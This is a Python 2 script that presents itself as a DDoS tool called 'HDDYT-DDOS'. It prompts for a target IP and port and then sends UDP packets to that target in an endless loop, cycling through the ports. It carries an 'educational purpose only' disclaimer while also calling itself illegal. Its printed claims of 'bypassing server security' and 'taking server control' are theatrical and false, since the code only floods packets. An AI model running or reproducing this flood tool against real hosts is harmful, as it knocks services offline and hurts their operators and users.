print("\003[91m")
import sys
import os
import time
import socket
import random

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._unrandom(1490)

os.system("clear")
os.system("figlet HDDYT-DDOS")

print
print "Coded By : HD Devil YT"
print "Author   : HD Devil YT"
print "Github   : github.com/HDDevilYT"
print "Note- Make Sure that you are using this Tool for Educational Purpose Only.. It is a illegal Tool.. Use It At Your Own Risk, We aren't responsible for your actions"
print

ip = raw_input("Target's IP : ")
port = input("Port       : ")
os.system("clear")
os.system("figlet HDDYT-DDOS")
print("Team : HD Devil YT")
print ("\033[96m")
print "____________________FINDING THE SERVER_________________________"
time.sleep(5)
print "_____________CONNECTING TO THE TARGET SERVER___________________"
time.sleep(5)
print "________0100100 BYPASSING SERVER SECURITY  001010______________"
time.sleep(5)
print "__________________TAKING SEVER CONTROL_________________________"
time.sleep(5)
print "    PERFORMING THE DDOS ATTACK IN THE SERVER    "
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
